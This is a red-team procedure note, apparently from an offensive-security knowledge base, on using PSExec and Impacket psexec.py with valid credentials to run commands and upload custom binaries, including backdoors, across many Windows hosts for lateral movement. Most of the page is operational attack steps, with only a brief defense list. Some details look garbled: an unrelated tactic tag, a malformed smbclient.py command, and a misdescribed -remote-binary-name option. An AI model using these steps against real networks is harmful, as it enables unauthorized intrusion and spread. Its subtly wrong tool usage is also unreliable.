---
type: procedure
description: >-
  Execute commands and binaries on remote Windows systems using Impacket's
  psexec.py and Sysinternals PSExec with valid credentials for lateral movement
  and remote execution.
verified: true
submitted: false
tactics:
  - '[[Lateral Movement]]'
  - '[[Execution]]'
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[SMB-Windows Admin Shares]]'
  - '[[Valid Accounts]]'
  - '[[Service Execution]]'
sub_techniques: []
tags:
  - impacket
  - psexec
  - windows
  - lateral-movement
  - remote-execution
  - credentials
commands:
  - '[[commands/psexec-execute-remote-command]]'
  - '[[commands/psexec-execute-on-multiple-targets-from-file]]'
  - '[[commands/impacket-psexec-execute-custom-binary]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
  - '[[tools/PSExec]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# windows-impacket-psexec-remote-execution-with-credentials

## Summary

This procedure demonstrates how to use Impacket's psexec.py script and the Sysinternals PSExec tool to execute commands and custom binaries on remote Windows systems using valid credentials. It enables lateral movement by authenticating to target hosts over SMB and running processes with the privileges of the provided account, useful for post-exploitation scenarios where credentials have been obtained.

## Description

Impacket provides Python implementations for network protocols like SMB, allowing tools like psexec.py to mimic legitimate Windows administration by creating temporary services on remote hosts to execute payloads. PSExec, a native Windows tool from Sysinternals, achieves similar results by copying an executable to the target and starting it as a service. Both methods require valid domain or local credentials and network access to SMB ports (445). This technique is commonly used in red team engagements for lateral movement after initial access, such as following credential dumping or phishing. Success grants shell access or arbitrary code execution on the target, limited by the credential's privileges. Potential risks include detection via anomalous SMB traffic or service creation logs.

## Requirements

1. Valid username and password (domain or local) with execute privileges on the target Windows system.
2. Network connectivity to the target over TCP/445 (SMB).
3. Impacket library installed (for psexec.py) or PSExec executable downloaded (for native usage).
4. Attacker machine running Python 3 (for Impacket) or Windows-compatible environment (for PSExec).
5. For multiple targets: A text or CSV file listing target hostnames or IPs.

## Defense

- Implement least privilege: Use non-admin accounts for services and restrict SMB access.
- Enable SMB signing and monitor for unsigned traffic.
- Log and alert on anomalous service creation (Event ID 7045) and SMB connections from unexpected sources.
- Use endpoint detection tools to block unsigned binaries and monitor process creation from PSEXESVC.exe or temporary services.
- Enforce credential rotation and multi-factor authentication to limit credential reuse.

## Objectives

1. Authenticate to remote Windows hosts using provided credentials.
2. Execute arbitrary commands or binaries remotely to establish command shell access.
3. Perform lateral movement to multiple targets for broader network compromise.
4. Maintain access through persistent service-based execution if needed.

## Instructions

### Step 1: Execute Command on Single Remote Host Using PSExec

**Context**: This step uses the native PSExec tool to run a simple command on a single target, verifying credential validity and establishing basic remote execution. It's ideal for quick checks or one-off tasks, as PSExec handles authentication and output redirection.

**Command** ([[commands/psexec-execute-remote-command]]):
```bash
psexec.exe \\$_TARGET -u $_USERNAME -p $_PASSWORD $_COMMAND
```

> This command authenticates to the target via SMB, copies a minimal executable, and runs the specified command (e.g., 'whoami' or 'cmd.exe'). Replace placeholders with actual values. If successful, it returns the command output directly in the terminal. Use this when Impacket is unavailable or for native Windows environments. Verify by checking for the PSEXESVC service on the target post-execution (it self-deletes on completion).

### Step 2: Execute Command on Multiple Targets from File Using PSExec

**Context**: For scaling to multiple hosts, read targets from a file (e.g., targets.txt with one IP/hostname per line) and redirect output to CSV for logging. This automates lateral movement across a compromised network segment, capturing results for analysis.

**Command** ([[commands/psexec-execute-on-multiple-targets-from-file]]):
```bash
psexec.exe @$_TARGETS_FILE -u $_USERNAME -p $_PASSWORD $_COMMAND > $_OUTPUT.csv
```

> The @ symbol tells PSExec to read targets from the file. The command executes $_COMMAND on each valid host and appends output to the CSV, including errors for unreachable hosts. Parse the CSV afterward to identify successful connections. This step assumes uniform credentials across targets; for mixed creds, use a script wrapper. Expected: CSV rows with hostnames, outputs, and timestamps.

### Step 3: Execute Custom Binary Remotely Using Impacket psexec.py

**Context**: Upload and run a custom executable (e.g., a backdoor or tool) by specifying it as the remote binary. Impacket creates a temporary service named after your choice, executes the binary from ADMIN$, and cleans up. This is stealthier than PSExec for custom payloads, avoiding the standard PSEXESVC.

**Command** ([[commands/impacket-psexec-execute-custom-binary]]):
```bash
psexec.py $_USERNAME:$_PASSWORD@$_TARGET_IP -service-name $_SERVICE_NAME -remote-binary-name $_BINARY_PATH
```

> Provide credentials in URI format, target IP, a unique service name (e.g., 'updatesvc'), and the path to your binary on the attacker machine (it uploads automatically). The binary runs with the user's privileges. If the binary is interactive (e.g., a shell), pipe input/output as needed. Verify success by checking for the service on the target (sc.exe query $_SERVICE_NAME) before it deletes. Use this for privilege escalation if the creds are admin-level.

### Step 4: Upload Binary to ADMIN$ Share for Manual Execution

**Context**: Before custom execution, manually upload files to the hidden ADMIN$ share using SMB tools. This prepares payloads for service-based execution or direct invocation, bypassing some AV if the binary is clean.

**Command** (using Impacket smbclient.py for upload):
```bash
smbclient.py $_USERNAME:$_PASSWORD@$_TARGET_IP -U ADMIN$ -c 'put $_LOCAL_BINARY_PATH $_REMOTE_PATH'
```

> This connects to ADMIN$ (requires admin creds), uploads the file, and allows verification with 'ls'. Once uploaded, reference the remote path in Step 3's -remote-binary-name. Expected: Confirmation of upload and file listing on share. This step adds flexibility for staged payloads.
